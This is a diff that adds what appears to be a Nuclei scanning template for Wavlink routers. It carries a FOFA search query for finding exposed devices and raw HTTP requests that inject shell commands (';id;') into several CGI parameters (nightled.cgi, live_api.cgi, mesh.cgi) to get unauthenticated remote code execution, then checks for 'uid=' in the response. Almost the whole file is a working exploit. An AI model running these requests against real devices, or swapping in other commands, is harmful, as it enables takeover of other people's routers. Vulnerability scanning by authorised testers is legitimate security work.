@@ -1,0 +1,45 @@
+
+id: wavlink-rce-all
+
+info:
+  name: 睿因科技-wavlink-路由器-多处前台RCE
+  author: rain
+  severity: critical
+  metadata:
+    fofa-query: icon_hash="-1350437236"
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+
+
+http:
+  - raw:
+      - |  
+        POST /{{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        
+        page=night_led&start_hour=;id;
+      - |
+        GET /cgi-bin/.{{filename}}.txt HTTP/1.1
+        Host:{{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0a/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+
+    attack: batteringram
+    payloads:
+      path:
+        - /cgi-bin/nightled.cgi
+        - /cgi-bin/live_api.cgi?page=abc&id=173&ip=;id;
+        - /cgi-bin/mesh.cgi?page=upgrade&key=';id>.{{filename}}.txt;'
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body, "uid=")
